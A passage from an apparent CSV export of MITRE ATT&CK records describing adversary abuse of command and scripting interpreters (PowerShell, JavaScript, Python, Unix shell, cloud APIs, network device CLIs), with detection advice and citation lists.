Understanding standard usage patterns is important to avoid a high number of false positives. If scripting is restricted for normal users, then any attempts to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.",macOS,"Command: Command Execution, Process: OS API Execution, Process: Process Creation",True,T1059,,"Phil Stokes, SentinelOne",,0.0,,,,"(Citation: wardle evilquest parti),(Citation: MacKeeper Bundlore Apr 2019),(Citation: objsee mac malware 2017),(Citation: SentinelLabs reversing run-only applescripts 2021),(Citation: applescript signing)"
T1059.009,attack-pattern--55bb4471-ff1f-43b4-88c1-c9384ec47abf,Command and Scripting Interpreter: Cloud API,"Adversaries may abuse cloud APIs to execute malicious commands. APIs available in cloud environments provide various functionalities and are a feature-rich method for programmatic access to nearly all aspects of a tenant. These APIs may be utilized through various methods such as command line interpreters (CLIs), in-browser Cloud Shells, [PowerShell](https://attack.mitre.org/techniques/T1059/001) modules like Azure for PowerShell(Citation: Microsoft - Azure PowerShell), or software developer kits (SDKs) available for languages such as [Python](https://attack.mitre.org/techniques/T1059/006).  

Cloud API functionality may allow for administrative access across all major services in a tenant such as compute, storage, identity and access management (IAM), networking, and security policies.

With proper permissions (often via use of credentials such as [Application Access Token](https://attack.mitre.org/techniques/T1550/001) and [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004)), adversaries may abuse cloud APIs to invoke various functions that execute malicious actions. For example, CLI and PowerShell functionality may be accessed through binaries installed on cloud-hosted or on-premises hosts or accessed through a browser-based cloud shell offered by many cloud platforms (such as AWS, Azure, and GCP). These cloud shells are often a packaged unified environment to use CLI and/or scripting modules hosted as a container in the cloud environment.  ",https://attack.mitre.org/techniques/T1059/009,17 March 2022,14 April 2023,enterprise-attack,1.0,Execution,,"Azure AD, Google Workspace, IaaS, Office 365, SaaS",Command: Command Execution,True,T1059,,Caio Silva; Jason Sevilla; Marcus Weeks; Nichols Jasper; Ozan Olali,,0.0,,,,"(Citation: GitHub Pacu),(Citation: Talos TeamTNT),(Citation: MSTIC Nobelium Toolset May 2021),"
T1059.007,attack-pattern--0f4a0c76-ab2d-4cb0-85d3-3f0efb8cba0d,Command and Scripting Interpreter: JavaScript,"Adversaries may abuse various implementations of JavaScript for execution. JavaScript (JS) is a platform-independent scripting language (compiled just-in-time at runtime) commonly associated with scripts in webpages, though JS can be executed in runtime environments outside the browser.(Citation: NodeJS)

JScript is the Microsoft implementation of the same scripting standard. JScript is interpreted via the Windows Script engine and thus integrated with many components of Windows such as the [Component Object Model](https://attack.mitre.org/techniques/T1559/001) and Internet Explorer HTML Application (HTA) pages.(Citation: JScrip May 2018)(Citation: Microsoft JScript 2007)(Citation: Microsoft Windows Scripts)

JavaScript for Automation (JXA) is a macOS scripting language based on JavaScript, included as part of Apple’s Open Scripting Architecture (OSA), that was introduced in OSX 10.10. Apple’s OSA provides scripting capabilities to control applications, interface with the operating system, and bridge access into the rest of Apple’s internal APIs. As of OSX 10.10, OSA only supports two languages, JXA and [AppleScript](https://attack.mitre.org/techniques/T1059/002). Scripts can be executed via the command line utility <code>osascript</code>, they can be compiled into applications or script files via <code>osacompile</code>, and they can be compiled and executed in memory of other programs by leveraging the OSAKit Framework.(Citation: Apple About Mac Scripting 2016)(Citation: SpecterOps JXA 2020)(Citation: SentinelOne macOS Red Team)(Citation: Red Canary Silver Sparrow Feb2021)(Citation: MDSec macOS JXA and VSCode)

Adversaries may abuse various implementations of JavaScript to execute various behaviors. Common uses include hosting malicious scripts on websites as part of a [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) or downloading and executing these script files as secondary payloads. Since these payloads are text-based, it is also very common for adversaries to obfuscate their content as part of [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027).",https://attack.mitre.org/techniques/T1059/007,23 June 2020,16 August 2021,enterprise-attack,2.1,Execution,"Monitor for events associated with scripting execution, such as process activity, usage of the Windows Script Host (typically cscript.exe or wscript.exe), file activity involving scripts, or loading of modules associated with scripting languages (ex: JScript.dll). Scripting execution is likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for execution and subsequent behavior. Actions may be related to network and system information [Discovery](https://attack.mitre.org/tactics/TA0007), [Collection](https://attack.mitre.org/tactics/TA0009), or other programmable post-compromise behaviors and could be used as indicators of detection leading back to the source.

Monitor for execution of JXA through <code>osascript</code> and usage of <code>OSAScript</code> API that may be related to other suspicious behavior occurring on the system.

Understanding standard usage patterns is important to avoid a high number of false positives. If scripting is restricted for normal users, then any attempts to enable related components running on a system would be considered suspicious. If scripting is not commonly used on a system, but enabled, execution running out of cycle from patching or other administrator functions is suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.","Linux, Windows, macOS","Command: Command Execution, Module: Module Load, Process: Process Creation, Script: Script Execution",True,T1059,,"Cody Thomas, SpecterOps","Administrator, SYSTEM, User",,,,,"(Citation: Cofense Astaroth Sept 2018),(Citation: Cybereason Chaes Nov 2020),(Citation: Cyber Forensicator Silence Jan 2019),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: SecureList Griffon May 2019),(Citation: Medium Metamorfo Apr 2020),(Citation: DFIR Conti Bazar Nov 2021),(Citation: MoustachedBouncer ESET August 2023),(Citation: Malwarebytes Higaisa 2020),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: Rewterz Sidewinder COVID-19 June 2020),(Citation: Unit 42 Cobalt Gang Oct 2018),(Citation: Secureworks GOLD KINGSWOOD September 2018),(Citation: Trend Micro Black Basta October 2022),(Citation: MSTIC Nobelium Toolset May 2021),(Citation: Hornet Security Avaddon June 2020),(Citation: Malwarebytes Konni Aug 2021),(Citation: Group IB Cobalt Aug 2017),(Citation: VirusBulletin Kimsuky October 2019),(Citation: ESET EvilNum July 2020),(Citation: ClearSky MuddyWater Nov 2018),(Citation: Talos Cobalt Strike September 2020),(Citation: Symantec WastedLocker June 2020),(Citation: Flashpoint FIN 7 March 2019),(Citation: Zscaler Higaisa 2020),(Citation: Symantec Leafminer July 2018),(Citation: FireEye MuddyWater Mar 2018),(Citation: TrendMicro Cobalt Group Nov 2017),(Citation: Kaspersky MoleRATs April 2019),(Citation: Talos Cobalt Group July 2018),(Citation: Kaspersky QakBot September 2021),(Citation: TrendMicro EarthLusca 2022),(Citation: PTSecurity Higaisa 2020),(Citation: Mandiant APT41),(Citation: Morphisec Cobalt Gang Oct 2018),(Citation: Cybereason Valak May 2020),(Citation: Securelist Brazilian Banking Malware July 2020),(Citation: CISA AA20-301A Kimsuky),(Citation: MacKeeper Bundlore Apr 2019),(Citation: Proofpoint TA505 Sep 2017),(Citation: ATT Sidewinder January 2021),(Citation: Cylance Dust Storm),(Citation: Unit42 Xbash Sept 2018),(Citation: DHS CISA AA22-055A MuddyWater February 2022),(Citation: Proofpoint TA505 June 2018),(Citation: fsecure NanHaiShu July 2016),(Citation: Cybereason Cobalt Kitty 2017),(Citation: Kaspersky Adwind Feb 2016),(Citation: Prevailion DarkWatchman 2021),(Citation: ESET InvisiMole June 2020),(Citation: Trend Micro FIN6 October 2019),(Citation: ESET Turla Mosquito Jan 2018),(Citation: PTSecurity Cobalt Group Aug 2017),(Citation: Awake Security Avaddon),(Citation: Mandiant Suspected Turla Campaign February 2023),(Citation: Volexity Ocean Lotus November 2020),(Citation: CrowdStrike Carbon Spider August 2021),(Citation: FireEye FIN7 Aug 2018),(Citation: Malwarebytes Kimsuky June 2021),(Citation: Donut Github),(Citation: win10_asr)"
T1059.008,attack-pattern--818302b2-d640-477b-bf88-873120ce85c4,Command and Scripting Interpreter: Network Device CLI,"Adversaries may abuse scripting or built-in command line interpreters (CLI) on network devices to execute malicious command and payloads. The CLI is the primary means through which users and administrators interact with the device in order to view system information, modify device operations, or perform diagnostic and administrative functions. CLIs typically contain various permission levels required for different commands. 

Scripting interpreters automate tasks and extend functionality beyond the command set included in the network OS. The CLI and scripting interpreter are accessible through a direct console connection, or through remote means, such as telnet or [SSH](https://attack.mitre.org/techniques/T1021/004).

Adversaries can use the network CLI to change how network devices behave and operate. The CLI may be used to manipulate traffic flows to intercept or manipulate data, modify startup configuration parameters to load malicious system software, or to disable security features or logging to avoid detection.(Citation: Cisco Synful Knock Evolution)",https://attack.mitre.org/techniques/T1059/008,20 October 2020,19 April 2022,enterprise-attack,1.1,Execution,"Consider reviewing command history in either the console or as part of the running memory to determine if unauthorized or suspicious commands were used to modify device configuration.(Citation: Cisco IOS Software Integrity Assurance - Command History)

Consider comparing a copy of the network device configuration against a known-good version to discover unauthorized changes to the command interpreter. The same process can be accomplished through a comparison of the run-time memory, though this is non-trivial and may require assistance from the vendor.",Network,Command: Command Execution,True,T1059,,,,1.0,,,,",(Citation: Cisco IOS Software Integrity Assurance - TACACS),(Citation: Cisco IOS Software Integrity Assurance - AAA)"
T1059.001,attack-pattern--970a3432-3237-47ad-bcca-7d8cbb217736,Command and Scripting Interpreter: PowerShell,"Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system.(Citation: TechNet PowerShell) Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).

PowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.

A number of PowerShell-based offensive testing tools are available, including [Empire](https://attack.mitre.org/software/S0363),  [PowerSploit](https://attack.mitre.org/software/S0194), [PoshC2](https://attack.mitre.org/software/S0378), and PSAttack.(Citation: Github PSAttack)

PowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell's underlying <code>System.Management.Automation</code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI).(Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015)(Citation: Microsoft PSfromCsharp APR 2014)",https://attack.mitre.org/techniques/T1059/001,09 March 2020,27 March 2023,enterprise-attack,1.3,Execution,"If proper execution policy is set, adversaries will likely be able to define their own execution policy if they obtain administrator or system access, either through the Registry or at the command line. This change in policy on a system may be a way to detect malicious use of PowerShell. If PowerShell is not used in an environment, then simply looking for PowerShell execution may detect malicious activity.

Monitor for loading and/or execution of artifacts associated with PowerShell specific assemblies, such as System.Management.Automation.dll (especially to unusual process names/locations).(Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015)

It is also beneficial to turn on PowerShell logging to gain increased fidelity in what occurs during execution (which is applied to .NET invocations). (Citation: Malware Archaeology PowerShell Cheat Sheet) PowerShell 5.0 introduced enhanced logging capabilities, and some of those features have since been added to PowerShell 4.0. Earlier versions of PowerShell do not have many logging features.(Citation: FireEye PowerShell Logging 2016) An organization can gather PowerShell execution details in a data analytic platform to supplement it with other data.

Consider monitoring for Windows event ID (EID) 400, which shows the version of PowerShell executing in the <code>EngineVersion</code> field (which may also be relevant to detecting a potential [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)) as well as if PowerShell is running locally or remotely in the <code>HostName</code> field. Furthermore, EID 400 may indicate the start time and EID 403 indicates the end time of a PowerShell session.(Citation: inv_ps_attacks)",Windows,"Command: Command Execution, Module: Module Load, Process: Process Creation, Process: Process Metadata, Script: Script Execution",True,T1059,,"Mayuresh Dani, Qualys; Praetorian; Ross Brittain",,1.0,,,,"(Citation: Medium S2W WhisperGate January 2022),(Citation: Bitdefender Sardonic Aug 2021),(Citation: Unit 42 Inception November 2018),(Citation: Anomali MUSTANG PANDA October 2019),(Citation: Cisco Ukraine Wipers January 2022),(Citation: Forcepoint Monsoon),(Citation: Telefonica Snip3 December 2021),(Citation: Trend Micro Muddy Water March 2021),(Citation: Cybereason PowerLess February 2022),(Citation: Morphisec Snip3 May 2021),(Citation: CrowdStrike StellarParticle January 2022),(Citation: CISA WellMess July 2020),(Citation: CISA AA20-239A BeagleBoyz August 2020),(Citation: DHS/CISA Ransomware Targeting Healthcare October 2020),(Citation: CME Github September 2018),(Citation: Symantec Waterbug Jun 2019),(Citation: Mandiant FIN12 Oct 2021),(Citation: Symantec WastedLocker June 2020),(Citation: Lab52 WIRTE Apr 2019),(Citation: Talos Cobalt Strike September 2020),(Citation: Carbon Black JCry May 2019),(Citation: Unit 42 Magic Hound Feb 2017),(Citation: Cymmetria Patchwork),(Citation: Accenture MUDCARP March 2019),(Citation: DFIR Report APT35 ProxyShell March 2022),(Citation: CobaltStrike Daddy May 2017),(Citation: ESET Nomadic Octopus 2018),(Citation: BleepingComputer Molerats Dec 2020),(Citation: Talos Lokibot Jan 2021),(Citation: Palo Alto OilRig Sep 2018),(Citation: Microsoft Unidentified Dec 2018),(Citation: Unit42 DarkHydrus Jan 2019),(Citation: SecureWorks August 2019),(Citation: Talos MuddyWater Jan 2022),(Citation: TrendMicro EarthLusca 2022),(Citation: Check Point Warzone Feb 2020),(Citation: Check Point Meteor Aug 2021),(Citation: CrowdStrike BloodHound April 2018),(Citation: Kaspersky Cloud Atlas December 2014),(Citation: CISA AA20-301A Kimsuky),(Citation: Symantec Gallmaker Oct 2018),(Citation: OilRig New Delivery Oct 2017),(Citation: FireEye APT19),(Citation: Unit 42 Gorgon Group Aug 2018),(Citation: NCSC Joint Report Public Tools),(Citation: Sophos Netwalker May 2020),(Citation: US-CERT TA18-074A),(Citation: Talos Frankenstein June 2019),(Citation: Volexity Exchange Marauder March 2021),(Citation: Github PowerShell Empire),(Citation: ESET Dukes October 2019),(Citation: Unit 42 DarkHydrus July 2018),(Citation: DHS CISA AA22-055A MuddyWater February 2022),(Citation: Cisco DNSMessenger March 2017),(Citation: ESET Turla PowerShell May 2019),(Citation: ESET Turla Mosquito May 2018),(Citation: Cofense RevengeRAT Feb 2019),(Citation: Korean FSI TA505 2020),(Citation: Symantec Chafer February 2018),(Citation: PTSecurity Cobalt Group Aug 2017),(Citation: Talos Zeus Panda Nov 2017),(Citation: Volexity SolarWinds),(Citation: cobaltstrike manual),(Citation: CERT-FR PYSA April 2020),(Citation: Symantec FIN8 Jul 2023),(Citation: FireEye APT33 Guardrail),(Citation: Malwarebytes Kimsuky June 2021),(Citation: Proofpoint TA459 April 2017),(Citation: CheckPoint Bandook Nov 2020),(Citation: TrendMicro Confucius APT Aug 2021),(Citation: FireEye Periscope March 2018),(Citation: Unit 42 Playbook Dec 2017),(Citation: Microsoft Actinium February 2022),(Citation: Secureworks GandCrab and REvil September 2019),(Citation: ESET Lazarus Jun 2020),(Citation: Dragos Crashoverride 2018),(Citation: SecureList Griffon May 2019),(Citation: AADInternals Documentation),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: FireEye APT41 Aug 2019),(Citation: FireEye FIN10 June 2017),(Citation: Secureworks IRON HEMLOCK Profile),(Citation: NCC Group Black Basta June 2022),(Citation: CrowdStrike AQUATIC PANDA December 2021),(Citation: PWC WellMess July 2020),(Citation: Picus Emotet Dec 2018),(Citation: Proofpoint TA2541 February 2022),(Citation: Check Point APT35 CharmPower January 2022),(Citation: FireEye FIN6 Apr 2019),(Citation: Intel 471 REvil March 2020),(Citation: Flashpoint FIN 7 March 2019),(Citation: ZScaler Squirrelwaffle Sep 2021),(Citation: CISA AA21-200A APT40 July 2021),(Citation: Cisco Talos Avos Jun 2022),(Citation: FireEye MuddyWater Mar 2018),(Citation: TrendMicro Cobalt Group Nov 2017),(Citation: Carbon Black Emotet Apr 2019),(Citation: Kaspersky MoleRATs April 2019),(Citation: Talos Promethium June 2020),(Citation: FireEye FIN7 April 2017),(Citation: Microsoft POLONIUM June 2022),(Citation: Talos Sodinokibi April 2019),(Citation: SecureWorks BRONZE UNION June 2017),(Citation: ClearSky Charming Kitten Dec 2017),(Citation: ESET Exchange Mar 2021),(Citation: McAfee Cuba April 2021),(Citation: Securelist DarkVishnya Dec 2018),(Citation: Cybereason Valak May 2020),(Citation: TrendMicro MacOS April 2018),(Citation: Kaspersky WIRTE November 2021),(Citation: Reaqta MuddyWater November 2017),(Citation: Symantec Dragonfly Sept 2017),(Citation: Cybereason Cobalt Kitty 2017),(Citation: BitDefender Chafer May 2020),(Citation: FireEye APT41 March 2020),(Citation: Mandiant FIN13 Aug 2022),(Citation: TrendMicro Pawn Storm Dec 2020),(Citation: Talos MuddyWater May 2019),(Citation: TrendMicro Patchwork Dec 2017),(Citation: Cybereason Molerats Dec 2020),(Citation: FireEye FIN7 March 2017),(Citation: Trend Micro TA505 June 2019),(Citation: FireEye KEGTAP SINGLEMALT October 2020),(Citation: FireEye APT29),(Citation: FireEye Hancitor),(Citation: Deep Instinct TA505 Apr 2019),(Citation: Symantec Emotet Jul 2018),(Citation: Unit 42 QUADAGENT July 2018),(Citation: Symantec Elfin Mar 2019),(Citation: MoustachedBouncer ESET August 2023),(Citation: Lazarus RATANKBA),(Citation: Red Canary Emotet Feb 2019),(Citation: Secureworks BRONZE BUTLER Oct 2017),(Citation: Morphisec FIN7 June 2017),(Citation: TrendMicro POWERSTATS V3 June 2019),(Citation: FoxIT Wocao December 2019),(Citation: Microsoft Prestige ransomware October 2022),(Citation: Malwarebytes Konni Aug 2021),(Citation: Group IB Cobalt Aug 2017),(Citation: Cycraft Chimera April 2020),(Citation: ClearSky MuddyWater Nov 2018),(Citation: PowerSploit Documentation),(Citation: Palo Alto Sofacy 06-2018),(Citation: Symantec MuddyWater Dec 2018),(Citation: Cyberreason Anchor December 2019),(Citation: SentinelLabs Metador Technical Appendix Sept 2022),(Citation: TrendMicro Netwalker May 2020),(Citation: Cybereason Soft Cell June 2019),(Citation: Talos Cobalt Group July 2018),(Citation: Unit 42 MuddyWater Nov 2017),(Citation: Palo Alto OilRig May 2016),(Citation: Cybereason Oceanlotus May 2017),(Citation: Netskope Squirrelwaffle Oct 2021),(Citation: Group IB Silence Sept 2018),(Citation: Proofpoint Leviathan Oct 2017),(Citation: Kaspersky Lyceum October 2021),(Citation: FireEye TEMP.Veles 2018),(Citation: FireEye NETWIRE March 2019),(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021),(Citation: KISA Operation Muzabi),(Citation: CrowdStrike Grim Spider May 2019),(Citation: ATT Sidewinder January 2021),(Citation: Symantec Cicada November 2020),(Citation: Bitdefender FIN8 July 2021),(Citation: ESET T3 Threat Report 2021),(Citation: Bromium Ursnif Mar 2017),(Citation: Intrinsec Egregor Nov 2020),(Citation: Mandiant FIN7 Apr 2022),(Citation: ESET ComRAT May 2020),(Citation: FireEye FIN6 April 2016),(Citation: ESET Turla Mosquito Jan 2018),(Citation: FireEye APT29 Nov 2018),(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: Checkpoint MosesStaff Nov 2021),(Citation: FBI Flash FIN7 USB),(Citation: Google TAG Lazarus Jan 2021),(Citation: CrowdStrike Carbon Spider August 2021),(Citation: Kaspersky APT Trends Q1 April 2021),(Citation: BiZone Lizar May 2021),(Citation: Joint Cybersecurity Advisory Volt Typhoon June 2023),(Citation: Donut Github),(Citation: CISA AA20-259A Iran-Based Actor September 2020),(Citation: Cybereason TA505 April 2019),(Citation: FireEye POSHSPY April 2017),(Citation: Trend Micro Black Basta Spotlight September 2022),(Citation: Cyber Forensicator Silence Jan 2019),(Citation: Mandiant No Easy Breach),(Citation: Trend Micro DRBControl February 2020),(Citation: Gigamon BADHATCH Jul 2019),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: NCC Group Chimera January 2021),(Citation: Securelist MuddyWater Oct 2018),(Citation: FireEye APT34 Dec 2017),(Citation: Medium Ali Salem Bumblebee April 2022),(Citation: Morphisec ShellTea June 2019),(Citation: GitHub PowerSploit May 2012),(Citation: Microsoft Analyzing Solorigate Dec 2020),(Citation: Microsoft HAFNIUM March 2020),(Citation: Uptycs Warzone UAC Bypass November 2020),(Citation: Alperovitch 2014),(Citation: BlackBerry CostaRicto November 2020),(Citation: Crowdstrike Indrik November 2018),(Citation: Group IB Ransomware May 2020),(Citation: RATANKBA),(Citation: Crowdstrike MUSTANG PANDA June 2018),(Citation: Talos Kimsuky Nov 2021),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: MalwareBytes WoodyRAT Aug 2022),(Citation: FireEye Obfuscation June 2017),(Citation: Cybereason Kimsuky November 2020),(Citation: Group IB Ransomware September 2020),(Citation: Microsoft Iranian Threat Actor Trends November 2021),(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: Symantec Thrip June 2018),(Citation: Tetra Defense Sodinokibi March 2020),(Citation: ProofPoint SettingContent-ms July 2018),(Citation: Trend Micro njRAT 2018),(Citation: PWC KeyBoys Feb 2017),(Citation: Kaspersky Poseidon Group),(Citation: MuddyWater TrendMicro June 2018),(Citation: Costa AvosLocker May 2022),(Citation: Cobalt Strike TTPs Dec 2017),(Citation: Visa FIN6 Feb 2019),(Citation: FireEye APT32 May 2017),(Citation: PTSecurity Cobalt Dec 2016),(Citation: Bitdefender Trickbot VNC module Whitepaper 2021),(Citation: Crowdstrike Helix Kitten Nov 2018),(Citation: FireEye TRITON 2019),(Citation: Proofpoint TA505 Sep 2017),(Citation: CISA ComRAT Oct 2020),(Citation: Trend Micro Black Basta May 2022),(Citation: Unit42 Xbash Sept 2018),(Citation: FireEye Operation Double Tap),(Citation: FireEye SMOKEDHAM June 2021),(Citation: Microsoft Holmium June 2020),(Citation: EST Kimsuky April 2019),(Citation: Unit 42 WhisperGate January 2022),(Citation: Talos Konni May 2017),(Citation: Prevailion DarkWatchman 2021),(Citation: DFIR Phosphorus November 2021),(Citation: Anomali Static Kitten February 2021),(Citation: RiskIQ Cobalt Jan 2018),(Citation: Citizen Lab Stealth Falcon May 2016),(Citation: Symantec Seaduke 2015),(Citation: Red Canary Hospital Thwarted Ryuk October 2020),(Citation: RedCanary Mockingbird May 2020),(Citation: CrowdStrike Wizard Spider October 2020),(Citation: BitDefender BADHATCH Mar 2021),(Citation: ClearSky Wilted Tulip July 2017),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: Trend Micro Emotet Jan 2019),(Citation: GitHub Pupy),(Citation: Trustwave Pillowmint June 2020),(Citation: Microsoft Volt Typhoon May 2023),(Citation: ATT TeamTNT Chimaera September 2020),(Citation: NCC Group Team9 June 2020),(Citation: FireEye Know Your Enemy FIN8 Aug 2016),(Citation: FireEye APT35 2018),(Citation: Microsoft PS JEA),(Citation: Netspi PowerShell Execution Policy Bypass),(Citation: Microsoft PowerShell CLM)"
T1059.006,attack-pattern--cc3502b5-30cc-4473-ad48-42d51a6ef6d1,Command and Scripting Interpreter: Python,"Adversaries may abuse Python commands and scripts for execution. Python is a very popular scripting/programming language, with capabilities to perform many functions. Python can be executed interactively from the command-line (via the <code>python.exe</code> interpreter) or via scripts (.py) that can be written and distributed to different systems. Python code can also be compiled into binary executables.

Python comes with many built-in packages to interact with the underlying system, such as file operations and device I/O. Adversaries can use these libraries to download and execute commands or other scripts as well as perform various malicious behaviors.",https://attack.mitre.org/techniques/T1059/006,09 March 2020,26 July 2021,enterprise-attack,1.0,Execution,"Monitor systems for abnormal Python usage and python.exe behavior, which could be an indicator of malicious activity. Understanding standard usage patterns is important to avoid a high number of false positives. If scripting is restricted for normal users, then any attempts to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.

Scripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information Discovery, Collection, or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script.","Linux, Windows, macOS","Command: Command Execution, Process: Process Creation",True,T1059,,,"Administrator, root, SYSTEM",,Python is installed.,,,"(Citation: TrendMicro Tonto Team October 2020),(Citation: Cybereason Chaes Nov 2020),(Citation: ESET Machete July 2019),(Citation: ESET Ebury Oct 2017),(Citation: FBI FLASH APT39 September 2020),(Citation: Trend Micro Muddy Water March 2021),(Citation: Morphisec ShellTea June 2019),(Citation: GitHub SILENTTRINITY March 2022),(Citation: Trend Micro Tick November 2019),(Citation: FoxIT Wocao December 2019),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: CitizenLab KeyBoy Nov 2016),(Citation: Zscaler APT31 Covid-19 October 2020),(Citation: Riskiq Remcos Jan 2018),(Citation: Securelist Machete Aug 2014),(Citation: Talos Cobalt Strike September 2020),(Citation: Google Election Threats October 2020),(Citation: Unit 42 MechaFlounder March 2019),(Citation: Volexity InkySquid RokRAT August 2021),(Citation: CobaltStrike Daddy May 2017),(Citation: Anomali Rocke March 2019),(Citation: Cobalt Strike TTPs Dec 2017),(Citation: CheckPoint SpeakUp Feb 2019),(Citation: TrendMicro EarthLusca 2022),(Citation: Cylance Machete Mar 2017),(Citation: 360 Machete Sep 2020),(Citation: synack 2016 review),(Citation: CISA AA20-301A Kimsuky),(Citation: MacKeeper Bundlore Apr 2019),(Citation: KISA Operation Muzabi),(Citation: US-CERT TA18-074A),(Citation: CoinTicker 2019),(Citation: Unit42 CookieMiner Jan 2019),(Citation: BitDefender Chafer May 2020),(Citation: NCSC GCHQ Small Sieve Jan 2022),(Citation: Unit 42 IronNetInjector February 2021 ),(Citation: Symantec Seaduke 2015),(Citation: Checkpoint MosesStaff Nov 2021),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: Talos PoetRAT April 2020),(Citation: Cybereason Molerats Dec 2020),(Citation: GitHub Pupy),(Citation: CERT-FR PYSA April 2020),(Citation: ESET BackdoorDiplomacy Jun 2021),(Citation: CheckPoint Bandook Nov 2020),(Citation: Donut Github),"
T1059.004,attack-pattern--a9d4b653-6915-42af-98b2-5758c4ceee56,Command and Scripting Interpreter: Unix Shell,"Adversaries may abuse Unix shell commands and scripts for execution. Unix shells are the primary command prompt on Linux and macOS systems, though many variations of the Unix shell exist (e.g. sh, bash, zsh, etc.) depending on the specific OS or distribution.(Citation: DieNet Bash)(Citation: Apple ZShell) Unix shells can control every aspect of a system, with certain commands requiring elevated privileges.

Unix shells also support scripts that enable sequential execution of commands as well as other typical programming operations such as conditionals and loops. Common uses of shell scripts include long or repetitive tasks, or the need to run the same set of commands on multiple systems.

Adversaries may abuse Unix shells to execute various commands or payloads. Interactive shells may be accessed through command and control channels or during lateral movement such as with [SSH](https://attack.mitre.org/techniques/T1021/004). Adversaries may also leverage shell scripts to deliver and execute multiple commands on victims or as part of payloads used for persistence.",https://attack.mitre.org/techniques/T1059/004,09 March 2020,26 July 2021,enterprise-attack,1.1,Execution,"Unix shell usage may be common on administrator, developer, or power user systems, depending on job function. If scripting is restricted for normal users, then any attempt to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.

Scripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information discovery, collection, or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script. ","Linux, macOS","Command: Command Execution, Process: Process Creation",True,T1059,,,"root, User",1.0,,,,"(Citation: FireEye Periscope March 2018),(Citation: Unit 42 Kazuar May 2017),(Citation: Medium Anchor DNS July 2020),(Citation: CISA AppleJeus Feb 2021),(Citation: Scarlet Mimic Jan 2016),(Citation: ESET TeleBots Oct 2018),(Citation: Objective See Green Lambert for OSX Oct 2021),(Citation: ESET DazzleSpy Jan 2022),(Citation: Intezer Doki July 20),(Citation: 20 macOS Common Tools and Techniques),(Citation: sentinelone apt32 macOS backdoor 2020),(Citation: Carbon Black Shlayer Feb 2019),(Citation: Aqua Kinsing April 2020),(Citation: Red Canary NETWIRE January 2020),(Citation: Objective-See MacMa Nov 2021),(Citation: Cisco Talos Intelligence Group),(Citation: ANSSI Sandworm January 2021),(Citation: Leonardo Turla Penquin May 2020),(Citation: Glitch-Cat Green Lambert ATTCK Oct 2021),(Citation: ESET Kobalos Feb 2021),(Citation: Trend Micro TeamTNT),(Citation: sentinelone shlayer to zshlayer),(Citation: Fidelis Turbo),(Citation: MacKeeper Bundlore Apr 2019),(Citation: Chaos Stolen Backdoor),(Citation: Unit 42 Hildegard Malware),(Citation: objsee mac malware 2017),(Citation: Talos Rocke August 2018),(Citation: objective-see windtail1 dec 2018),(Citation: ObjectiveSee AppleJeus 2019),(Citation: CoinTicker 2019),(Citation: objectivesee osx.shlayer apple approved 2020),(Citation: Unit42 CookieMiner Jan 2019),(Citation: Proofpoint NETWIRE December 2020),(Citation: Trend Micro MacOS Backdoor November 2020),(Citation: trendmicro xcsset xcode project 2020),(Citation: NSA/FBI Drovorub August 2020),(Citation: FireEye APT41 March 2020),(Citation: Fysbis Palo Alto Analysis),(Citation: ESET LoudMiner June 2019),(Citation: ESET BackdoorDiplomacy Jun 2021),(Citation: Trend Micro Skidmap),"
T1059.005,attack-pattern--dfd7cc1d-e1d8-4394-a198-97c4cab8aa67,Command and Scripting Interpreter: Visual Basic,"Adversaries may abuse Visual Basic (VB) for execution. VB is a programming language created by Microsoft with interoperability with many Windows technologies such as [Component Object Model](https://attack.mitre.org/techniques/T1559/001) and the [Native API](https://attack.mitre.org/techniques/T1106) through the Windows API. Although tagged as legacy with no planned future evolutions, VB is integrated and supported in the .NET Framework and cross-platform .NET Core.(Citation: VB .NET Mar 2020)(Citation: VB Microsoft)

